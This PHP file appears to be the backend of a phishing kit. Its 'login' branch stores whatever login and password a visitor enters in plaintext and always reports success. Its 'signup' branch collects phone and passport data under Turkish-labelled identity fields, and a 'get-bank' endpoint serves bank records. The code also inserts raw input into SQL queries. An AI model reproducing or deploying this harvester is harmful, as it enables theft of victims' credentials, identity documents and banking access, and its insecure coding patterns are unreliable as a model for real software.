<?php

include 'inc/config.php';
include 'inc/functions.php';
include 'inc/anti.php';

$q = $_GET['q'];

if ($q == 'login') {
  antiflood();
  $login = escape('login');
  $password = escape('password');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
  $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
    die('error_phone');
  }elseif (isset($user['id'])) {
    $db -> query("UPDATE users set device = '$device' where id = '$user[id]'");
    $_SESSION['user_id'] = $user['id'];
    die('success');
  }else{
    $db -> query("INSERT into users set
      login='$login',
      password='$password',
      device='$device',
      ip='$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die('success');
  }
}elseif($q == 'logout'){
  session_destroy();
}elseif($q == 'signup' && !isset($us['id'])){
  antiflood();
  $login = escape('field_first');
  $password = escape('field_second');
  $email = escape('email');
  $adi = escape('adi');
  $soyadi = escape('soyadi');
  $gun = escape('gun');
  $ay = escape('ay');
  $yil = escape('yil');
  $ulke = escape('ulke');
  $bolge = escape('bolge');
  $adres = escape('adres');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $type = intval(1);
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
  if (strlen($login) < 3 or strlen($password) < 3 or strlen($phone) < 10 or strlen($phone) > 14) {
    die('error');
  }else{
    $db -> query("INSERT into users set
      login = '$login',
      password = '$password',
      phone = '$phone',
      passport = '$passport',
      type = '$type',
      device = '$device',
      ip = '$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die('success');
  }
  
}elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }

?>
